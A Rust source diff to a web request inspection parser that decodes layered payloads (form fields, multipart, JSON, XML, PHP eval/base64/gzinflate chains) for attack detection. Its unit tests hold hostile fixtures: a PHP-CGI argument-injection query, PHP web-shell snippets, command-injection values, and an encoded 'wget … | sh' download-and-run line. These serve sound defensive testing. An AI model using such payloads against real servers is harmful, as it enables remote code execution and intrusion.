@@ -12,7 +12,7 @@ use std::sync::LazyLock;
 use regex::bytes::Regex;
 use serde_json::Value;
 
-use super::{Budget, Layer, LayerKind, Policy, Span, Xray, decode};
+use super::{Budget, Layer, LayerKind, OpaqueReason, Policy, Span, Xray, decode};
 
 /// Where the text comes from. `method`, `path` and `sender` are not read
 /// here; the rules above use them.
@@ -54,6 +54,8 @@ static CALL_CHAIN: LazyLock<Regex> = LazyLock::new(|| {
     Regex::new(r#"(?s-u)((?:[A-Za-z0-9_]+\s*\(\s*)+)(?:'((?:[^'\\]|\\.)*)'|"((?:[^"\\]|\\.)*)")"#)
         .expect("static regex")
 });
+static JSON_STRING: LazyLock<Regex> =
+    LazyLock::new(|| Regex::new(r#"(?s-u)"(?:[^"\\]|\\.)*""#).expect("static regex"));
 static IDENT: LazyLock<Regex> =
     LazyLock::new(|| Regex::new(r"(?-u)[A-Za-z0-9_]+").expect("static regex"));
 static CHR_RUN: LazyLock<Regex> = LazyLock::new(|| {
@@ -87,7 +89,7 @@ pub fn parse(source: Source<'_>, _policy: &Policy) -> Xray {
             &mut budget,
         )
     {
-        let before = xray.layers.len();
+        let before = at;
         body_is_php = read_query(&mut xray, at, &mut budget);
         settle(&mut xray, before, &mut budget);
     }
@@ -95,10 +97,20 @@ pub fn parse(source: Source<'_>, _policy: &Policy) -> Xray {
     let mut i = 0;
     while i < xray.layers.len() {
         let before = xray.layers.len();
-        read_layer(&mut xray, i, i == 0 && body_is_php, &mut budget);
-        settle(&mut xray, before, &mut budget);
-        if i == 0 {
+        if i == 0 && body_is_php {
+            // The whole body is PHP: the decoders go first so the call
+            // reader finds their layers and does not repeat them.
             decode::decode_all(&mut xray, 0, &mut budget);
+            let text = xray.layers[0].text.clone();
+            php_calls(&mut xray, 0, &text, &mut budget);
+        } else {
+            read_layer(&mut xray, i, &mut budget);
+            settle(&mut xray, before, &mut budget);
+            // Parts that were cut out of layer 0 were scanned as layers;
+            // scanning the whole again would open them twice.
+            if i == 0 && xray.layers.len() == before {
+                decode::decode_all(&mut xray, 0, &mut budget);
+            }
         }
         i += 1;
     }
@@ -112,6 +124,17 @@ fn settle(xray: &mut Xray, from: usize, budget: &mut Budget) {
             decode::decode_all(xray, at, budget);
         }
     }
+}
+
+/// Record that the rest of `layer` was not read.
+fn overflow(xray: &mut Xray, layer: usize) {
+    let end = xray.layers[layer].text.len();
+    let at = Span {
+        layer,
+        start: 0,
+        end,
+    };
+    decode::push_opaque(xray, at, OpaqueReason::OverLimit);
 }
 
 fn full(xray: &Xray, budget: &Budget) -> bool {
@@ -132,12 +155,24 @@ fn add(
     collapsed: usize,
     budget: &mut Budget,
 ) -> Option<usize> {
-    if bytes.is_empty()
-        || xray
-            .layers
-            .iter()
-            .any(|l: &Layer| l.parent == Some(parent) && l.text == bytes)
-    {
+    if bytes.is_empty() {
+        return None;
+    }
+    // The same text under the same parent is one layer; a second field
+    // name for it is a layer of its own, so the name is not lost.
+    let same = |l: &Layer| {
+        l.parent == Some(parent) && l.text == bytes && (name.is_none() || l.name == name)
+    };
+    if let Some(l) = xray.layers.iter_mut().find(|l| same(l)) {
+        // A decoded run that is also what `eval` runs is PHP.
+        if kind == LayerKind::Php
+            && matches!(
+                l.kind,
+                LayerKind::Base64 | LayerKind::Gzip | LayerKind::Hex | LayerKind::Escapes
+            )
+        {
+            l.kind = LayerKind::Php;
+        }
         return None;
     }
     let before = xray.layers.len();
@@ -193,19 +228,22 @@ fn form_fields(text: &[u8], layer: usize) -> Vec<Field> {
     let mut start = 0;
     for part in text.split(|&b| b == b'&') {
         let end = start + part.len();
-        if let Some(eq) = part.iter().position(|&b| b == b'=') {
+        // A part without `=` is all value.
+        let eq = part.iter().position(|&b| b == b'=');
+        let skip = eq.map_or(0, |eq| eq + 1);
+        if !part.is_empty() {
             fields.push(Field {
-                name: pct_decode(&part[..eq], true),
-                value: pct_decode(&part[eq + 1..], true),
+                name: eq.map_or_else(Vec::new, |eq| pct_decode(&part[..eq], true)),
+                value: pct_decode(&part[skip..], true),
                 span: Span {
                     layer,
-                    start: start + eq + 1,
+                    start: start + skip,
                     end,
                 },
             });
         }
         start = end + 1;
-        if fields.len() >= MAX_PARTS {
+        if fields.len() > MAX_PARTS {
             break;
         }
     }
@@ -218,13 +256,17 @@ fn emit_fields(
     xray: &mut Xray,
     parent: usize,
     kind: LayerKind,
-    fields: Vec<Field>,
+    mut fields: Vec<Field>,
     budget: &mut Budget,
 ) {
+    if fields.len() > MAX_PARTS {
+        fields.truncate(MAX_PARTS);
+        overflow(xray, parent);
+    }
     let mut i = 0;
     while i < fields.len() {
         if full(xray, budget) {
-            return;
+            return overflow(xray, parent);
         }
         let run = padding_run(&fields[i..]);
         let f = &fields[i];
@@ -242,8 +284,29 @@ fn emit_fields(
     }
 }
 
+/// Random padding: alphanumeric, mixed classes, not short, and nothing
+/// the decoders would open.
+fn noise(v: &[u8]) -> bool {
+    let has = |f: fn(&u8) -> bool| v.iter().any(f);
+    let classes = [
+        has(u8::is_ascii_lowercase),
+        has(u8::is_ascii_uppercase),
+        has(u8::is_ascii_digit),
+    ];
+    v.len() >= 5
+        && v.iter().all(u8::is_ascii_alphanumeric)
+        && classes.iter().filter(|&&c| c).count() >= 2
+        && !opens(v)
+}
+
+fn opens(v: &[u8]) -> bool {
+    (v.len() >= 16 && decode::base64_lenient(v).is_some_and(|b| decode::worth_opening(&b)))
+        || (v.len() >= 32 && decode::hex_bytes(v).is_some_and(|b| decode::worth_opening(&b)))
+}
+
 /// How many fields from the start share a stem (name minus trailing
-/// digits) and hold only alphanumeric values, as random padding does.
+/// digits) and hold values of similar length that look like noise. Any
+/// other value is kept as a layer of its own.
 fn padding_run(fields: &[Field]) -> usize {
     let stem = |n: &[u8]| {
         let cut = n
@@ -252,13 +315,18 @@ fn padding_run(fields: &[Field]) -> usize {
             .map_or(0, |p| p + 1);
         (cut > 0 && cut < n.len()).then(|| n[..cut].to_vec())
     };
-    let plain = |v: &[u8]| v.iter().all(u8::is_ascii_alphanumeric);
     let Some(first) = stem(&fields[0].name) else {
         return 1;
     };
+    let len = fields[0].value.len();
     fields
         .iter()
-        .take_while(|f| stem(&f.name).as_ref() == Some(&first) && plain(&f.value))
+        .take_while(|f| {
+            stem(&f.name).as_ref() == Some(&first)
+                && noise(&f.value)
+                && f.value.len() * 2 >= len
+                && len * 2 >= f.value.len()
+        })
         .count()
         .max(1)
 }
@@ -268,19 +336,26 @@ fn padding_run(fields: &[Field]) -> usize {
 fn read_query(xray: &mut Xray, at: usize, budget: &mut Budget) -> bool {
     let text = xray.layers[at].text.clone();
     let decoded = pct_decode(&text, true);
+    let mut php_cgi = false;
     if PHP_CGI.is_match(&decoded) {
         add(xray, at, LayerKind::PhpCgi, None, decoded, None, 0, budget);
-        return true;
+        php_cgi = true;
     }
     let fields = form_fields(&text, at);
     emit_fields(xray, at, LayerKind::Form, fields, budget);
-    false
+    php_blocks(xray, at, &decoded_text(&text), budget);
+    php_cgi
+}
+
+/// A query is read decoded for `<?php` blocks.
+fn decoded_text(text: &[u8]) -> Vec<u8> {
+    pct_decode(text, true)
 }
 
 /// Find what is inside layer `i` by its look.
-fn read_layer(xray: &mut Xray, i: usize, body_is_php: bool, budget: &mut Budget) {
+fn read_layer(xray: &mut Xray, i: usize, budget: &mut Budget) {
     if full(xray, budget) {
-        return;
+        return overflow(xray, i);
     }
     let kind = xray.layers[i].kind;
     let text = xray.layers[i].text.clone();
@@ -289,24 +364,13 @@ fn read_layer(xray: &mut Xray, i: usize, body_is_php: bool, budget: &mut Budget)
         LayerKind::PhpCgi | LayerKind::Shell | LayerKind::Query => return,
         _ => {}
     }
-    if body_is_php {
-        let whole = Span {
-            layer: i,
-            start: 0,
-            end: text.len(),
-        };
-        add(xray, i, LayerKind::Php, Some(whole), text, None, 0, budget);
-        return;
-    }
     let (start, end) = trim(&text);
     let head = &text[start..end];
     if CONTENT_DISPOSITION.is_match(head) {
         return multipart(xray, i, &text, budget);
     }
-    if matches!(head.first(), Some(b'{' | b'['))
-        && let Ok(value) = serde_json::from_slice::<Value>(head)
-    {
-        return json_strings(xray, i, &value, budget);
+    if matches!(head.first(), Some(b'{' | b'[' | b'"')) {
+        return json_strings(xray, i, head, budget);
     }
     let lower: Vec<u8> = head.iter().take(16).map(u8::to_ascii_lowercase).collect();
     let xml = lower.starts_with(b"<?xml")
@@ -317,21 +381,28 @@ fn read_layer(xray: &mut Xray, i: usize, body_is_php: bool, budget: &mut Budget)
     if xml {
         xml_texts(xray, i, &text, budget);
     }
-    let mut php = false;
-    for m in PHP_BLOCK.captures_iter(&text).take(MAX_PARTS) {
-        if full(xray, budget) {
-            return;
+    php_blocks(xray, i, &text, budget);
+    if !xml && i == 0 && kind == LayerKind::Raw && looks_like_form(head) {
+        let fields = form_fields(&text, i);
+        emit_fields(xray, i, LayerKind::Form, fields, budget);
+    }
+}
+
+/// `<?php ... ?>` blocks of `text`, the text of layer `parent`.
+fn php_blocks(xray: &mut Xray, parent: usize, text: &[u8], budget: &mut Budget) {
+    for (n, m) in PHP_BLOCK.captures_iter(text).enumerate() {
+        if full(xray, budget) || n >= MAX_PARTS {
+            return overflow(xray, parent);
         }
-        php = true;
         if let Some(g) = m.get(1) {
             let span = Span {
-                layer: i,
+                layer: parent,
                 start: g.start(),
                 end: g.end(),
             };
             add(
                 xray,
-                i,
+                parent,
                 LayerKind::Php,
                 Some(span),
                 g.as_bytes().to_vec(),
@@ -340,10 +411,6 @@ fn read_layer(xray: &mut Xray, i: usize, body_is_php: bool, budget: &mut Budget)
                 budget,
             );
         }
-    }
-    if !xml && !php && i == 0 && kind == LayerKind::Raw && looks_like_form(head) {
-        let fields = form_fields(&text, i);
-        emit_fields(xray, i, LayerKind::Form, fields, budget);
     }
 }
 
@@ -387,9 +454,10 @@ fn looks_like_form(head: &[u8]) -> bool {
 fn multipart(xray: &mut Xray, parent: usize, text: &[u8], budget: &mut Budget) {
     let starts: Vec<usize> = CONTENT_DISPOSITION
         .find_iter(text)
-        .take(MAX_PARTS)
+        .take(MAX_PARTS + 1)
         .map(|m| m.start())
         .collect();
+    let boundary = text_boundary(text);
     let mut fields = Vec::new();
     let mut names = Vec::new();
     for (n, &s) in starts.iter().enumerate() {
@@ -406,7 +474,7 @@ fn multipart(xray: &mut Xray, parent: usize, text: &[u8], budget: &mut Budget) {
         let file = param(line, b"filename", true);
         let name = param(line, b"name", false);
         let body_start = (head_end + sep).min(seg.len());
-        let body_end = body_start + content_len(&seg[body_start..]);
+        let body_end = body_start + content_len(&seg[body_start..], boundary);
         let span = Span {
             layer: parent,
             start: s + body_start,
@@ -429,7 +497,7 @@ fn multipart(xray: &mut Xray, parent: usize, text: &[u8], budget: &mut Budget) {
     // A file name that is more than a name is read as text of its own.
     for file in names {
         if full(xray, budget) {
-            return;
+            return overflow(xray, parent);
         }
         let name = Some(file.clone());
         add(
@@ -445,16 +513,25 @@ fn multipart(xray: &mut Xray, parent: usize, text: &[u8], budget: &mut Budget) {
     }
 }
 
+/// The boundary line (with its dashes) when the text opens with one.
+fn text_boundary(text: &[u8]) -> Option<&[u8]> {
+    let (start, _) = trim(text);
+    let line = text[start..].split(|&b| b == b'\n').next()?;
+    let line = line.strip_suffix(b"\r").unwrap_or(line);
+    (line.starts_with(b"--") && line.len() > 2 && !line.iter().any(u8::is_ascii_whitespace))
+        .then_some(line)
+}
+
 /// Length of a part's content: up to the trailing boundary line, minus the
 /// line break before it.
-fn content_len(content: &[u8]) -> usize {
+fn content_len(content: &[u8], boundary: Option<&[u8]>) -> usize {
     let (_, end) = trim(content);
     let tail_start = content[..end]
         .iter()
         .rposition(|&b| b == b'\n')
         .map_or(0, |p| p + 1);
     let tail = &content[tail_start..end];
-    if tail.starts_with(b"--") && !tail.iter().any(u8::is_ascii_whitespace) {
+    if boundary.is_some_and(|b| tail.starts_with(b)) {
         let cut = &content[..tail_start];
         let cut = cut.strip_suffix(b"\n").unwrap_or(cut);
         cut.strip_suffix(b"\r").unwrap_or(cut).len()
@@ -488,49 +565,64 @@ fn param(line: &[u8], key: &[u8], to_last_quote: bool) -> Option<Vec<u8>> {
     None
 }
 
-/// Every string of a JSON document, keys included, in document order.
-fn json_strings(xray: &mut Xray, parent: usize, value: &Value, budget: &mut Budget) {
-    let mut stack: Vec<(&Value, Option<&str>)> = vec![(value, None)];
+/// Every string of a JSON document, keys included, in document order,
+/// then every string literal of the raw text (what a parser drops:
+/// repeated keys, text after the document, a bare string).
+fn json_strings(xray: &mut Xray, parent: usize, head: &[u8], budget: &mut Budget) {
     let mut parts = 0;
-    while let Some((v, key)) = stack.pop() {
-        if full(xray, budget) || parts >= MAX_PARTS {
-            return;
-        }
-        match v {
-            Value::String(s) => {
-                parts += 1;
-                add(
-                    xray,
-                    parent,
-                    LayerKind::Json,
-                    None,
-                    s.as_bytes().to_vec(),
-                    key.map(|k| k.as_bytes().to_vec()),
-                    0,
-                    budget,
-                );
+    if let Ok(value) = serde_json::from_slice::<Value>(head) {
+        let mut stack: Vec<(&Value, Option<&str>)> = vec![(&value, None)];
+        while let Some((v, key)) = stack.pop() {
+            if full(xray, budget) || parts >= MAX_PARTS {
+                return overflow(xray, parent);
             }
-            Value::Array(items) => stack.extend(items.iter().rev().map(|v| (v, key))),
-            Value::Object(map) => {
-                for (k, v) in map.iter().rev() {
-                    stack.push((v, Some(k)));
-                }
-                // Keys are read too, before their values.
-                for k in map.keys().rev() {
+            match v {
+                Value::String(s) => {
                     parts += 1;
+                    let name = key.map(|k| k.as_bytes().to_vec());
                     add(
                         xray,
                         parent,
                         LayerKind::Json,
                         None,
-                        k.as_bytes().to_vec(),
-                        None,
+                        s.as_bytes().to_vec(),
+                        name,
                         0,
                         budget,
                     );
                 }
+                Value::Array(items) => stack.extend(items.iter().rev().map(|v| (v, key))),
+                Value::Object(map) => {
+                    for (k, v) in map.iter().rev() {
+                        stack.push((v, Some(k)));
+                    }
+                    // Keys are read too.
+                    for k in map.keys() {
+                        parts += 1;
+                        let k = k.as_bytes().to_vec();
+                        add(xray, parent, LayerKind::Json, None, k, None, 0, budget);
+                    }
+                }
+                _ => {}
             }
-            _ => {}
+        }
+    }
+    for lit in JSON_STRING.find_iter(head) {
+        if full(xray, budget) || parts >= 2 * MAX_PARTS {
+            return overflow(xray, parent);
+        }
+        parts += 1;
+        if let Ok(s) = serde_json::from_slice::<String>(lit.as_bytes()) {
+            add(
+                xray,
+                parent,
+                LayerKind::Json,
+                None,
+                s.into_bytes(),
+                None,
+                0,
+                budget,
+            );
         }
     }
 }
@@ -569,7 +661,10 @@ fn xml_texts(xray: &mut Xray, parent: usize, text: &[u8], budget: &mut Budget) {
             budget,
         );
     };
-    while i < n && parts < MAX_PARTS && !full(xray, budget) {
+    while i < n {
+        if parts >= MAX_PARTS || full(xray, budget) {
+            return overflow(xray, parent);
+        }
         parts += 1;
         let rest = &text[i..];
         if text[i] != b'<' {
@@ -668,9 +763,10 @@ fn entities(seg: &[u8]) -> Vec<u8> {
 
 /// What the call chains and `chr()` runs of PHP text open up.
 fn php_calls(xray: &mut Xray, parent: usize, text: &[u8], budget: &mut Budget) {
-    for caps in CALL_CHAIN.captures_iter(text).take(MAX_PARTS) {
-        if full(xray, budget) {
-            return;
+    let mut inflate_left = super::MAX_OUTPUT;
+    for (n, caps) in CALL_CHAIN.captures_iter(text).enumerate() {
+        if full(xray, budget) || n >= MAX_PARTS {
+            return overflow(xray, parent);
         }
         let (Some(whole), Some(calls)) = (caps.get(0), caps.get(1)) else {
             continue;
@@ -687,8 +783,8 @@ fn php_calls(xray: &mut Xray, parent: usize, text: &[u8], budget: &mut Budget) {
             .map(|m| String::from_utf8_lossy(m.as_bytes()).to_ascii_lowercase())
             .collect();
         // The innermost call runs first.
-        for name in names.iter().rev() {
-            let limit = budget.output;
+        for name in names.iter().rev().take(super::MAX_DEPTH) {
+            let limit = budget.output.min(inflate_left);
             let step = match name.as_str() {
                 "base64_decode" => decode::base64_lenient(&bytes).map(|b| (b, LayerKind::Base64)),
                 "gzinflate" => decode::inflate_raw(&bytes, limit).map(|b| (b, LayerKind::Gzip)),
@@ -712,6 +808,9 @@ fn php_calls(xray: &mut Xray, parent: usize, text: &[u8], budget: &mut Budget) {
                 bytes.clear();
                 break;
             };
+            if matches!(k, LayerKind::Gzip) {
+                inflate_left = inflate_left.saturating_sub(next.len());
+            }
             bytes = next;
             kind = Some(k);
         }
@@ -726,9 +825,9 @@ fn php_calls(xray: &mut Xray, parent: usize, text: &[u8], budget: &mut Budget) {
         };
         add(xray, parent, kind, Some(span), bytes, None, 0, budget);
     }
-    for run in CHR_RUN.find_iter(text).take(MAX_PARTS) {
-        if full(xray, budget) {
-            return;
+    for (n, run) in CHR_RUN.find_iter(text).enumerate() {
+        if full(xray, budget) || n >= MAX_PARTS {
+            return overflow(xray, parent);
         }
         let bytes: Vec<u8> = CHR_ONE
             .captures_iter(run.as_bytes())
@@ -804,6 +903,7 @@ fn unescape(lit: &[u8], quote: u8) -> Vec<u8> {
 #[cfg(test)]
 mod tests {
     use super::*;
+    use crate::model::xray::OpaqueReason;
     use flate2::Compression;
     use flate2::write::DeflateEncoder;
     use std::io::Write;
@@ -960,10 +1060,106 @@ mod tests {
     fn php_cgi_injection_is_a_layer() {
         let x = request(
             Some("%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input"),
-            Some(b"system('id');"),
+            Some(b"eval(base64_decode('ZWNobyAiaGkiOw=='));"),
         );
         assert!(x.layers.iter().any(|l| l.kind == LayerKind::PhpCgi));
-        assert!(find_layer(&x, LayerKind::Php, b"system('id');").is_some());
+        // The body is read as PHP in place, not copied.
+        assert!(find_layer(&x, LayerKind::Php, b"echo \"hi\";").is_some());
+        assert_eq!(
+            x.layers.iter().filter(|l| l.kind == LayerKind::Php).count(),
+            1
+        );
+    }
+
+    #[test]
+    fn numbered_fields_with_real_values_are_all_kept() {
+        let x = request(None, Some(b"cmd0=ls&cmd1=id&cmd2=whoami"));
+        for (n, v) in [("cmd0", "ls"), ("cmd1", "id"), ("cmd2", "whoami")] {
+            let l = find_layer(&x, LayerKind::Form, v.as_bytes()).expect(v);
+            assert_eq!(l.name.as_deref(), Some(n.as_bytes()));
+            assert_eq!(l.collapsed, 0);
+        }
+    }
+
+    #[test]
+    fn numbered_fields_holding_base64_are_kept() {
+        let b = data_encoding::BASE64.encode(b"wget http://example.org/x -O- | sh");
+        let body = format!(
+            "p0=Qx7aB2&p1=m9Kd0e&p2=Zp3Lw8&p3={}",
+            b.trim_end_matches('=')
+        );
+        let x = request(None, Some(body.as_bytes()));
+        assert!(has_text(&x, b"wget http://example.org/x -O- | sh"));
+    }
+
+    #[test]
+    fn form_after_php_block_is_read() {
+        let x = request(None, Some(b"cmd=<?php system($_GET[1]);?>&b=hello+there"));
+        assert!(find_layer(&x, LayerKind::Form, b"hello there").is_some());
+        assert!(x.layers.iter().any(|l| l.kind == LayerKind::Php));
+    }
+
+    #[test]
+    fn query_without_equals_is_read() {
+        let x = request(Some(";wget%20x|sh"), None);
+        assert!(find_layer(&x, LayerKind::Form, b";wget x|sh").is_some());
+        let x = request(Some("<?php system($_GET[1]); ?>"), None);
+        assert!(x.layers.iter().any(|l| l.kind == LayerKind::Php));
+    }
+
+    #[test]
+    fn base64_blob_in_php_opens_once() {
+        let blob = data_encoding::BASE64.encode(b"echo 'one single layer here';");
+        let body = format!("<?php eval(base64_decode('{blob}')); ?>");
+        let x = request(None, Some(body.as_bytes()));
+        let n = x
+            .layers
+            .iter()
+            .filter(|l| l.text == b"echo 'one single layer here';")
+            .count();
+        assert_eq!(n, 1);
+    }
+
+    #[test]
+    fn dropped_parts_are_marked() {
+        let mut body = String::new();
+        for n in 0..300 {
+            body.push_str(&format!("f{n}x=v{n}&"));
+        }
+        body.push_str("last=payload");
+        let x = request(None, Some(body.as_bytes()));
+        assert!(x.opaque.iter().any(|o| o.reason == OpaqueReason::OverLimit));
+    }
+
+    #[test]
+    fn json_repeated_keys_and_tails_are_read() {
+        let x = request(
+            None,
+            Some(br#"{"a":"first payload","a":"second"} trailing "tail str""#),
+        );
+        assert!(find_layer(&x, LayerKind::Json, b"first payload").is_some());
+        assert!(find_layer(&x, LayerKind::Json, b"tail str").is_some());
+        let x = request(None, Some(br#""just a string""#));
+        assert!(find_layer(&x, LayerKind::Json, b"just a string").is_some());
+    }
+
+    #[test]
+    fn same_value_under_two_names_keeps_both_names() {
+        let x = request(None, Some(b"a=same+value&b=same+value"));
+        let names: Vec<_> = x
+            .layers
+            .iter()
+            .filter(|l| l.text == b"same value")
+            .collect();
+        assert_eq!(names.len(), 2);
+    }
+
+    #[test]
+    fn multipart_tail_that_is_not_the_boundary_stays() {
+        let body =
+            b"--b\r\nContent-Disposition: form-data; name=\"a\"\r\n\r\nline\r\n--x\r\n--b--\r\n";
+        let x = request(None, Some(body));
+        assert!(find_layer(&x, LayerKind::MultipartField, b"line\r\n--x").is_some());
     }
 
     #[test]
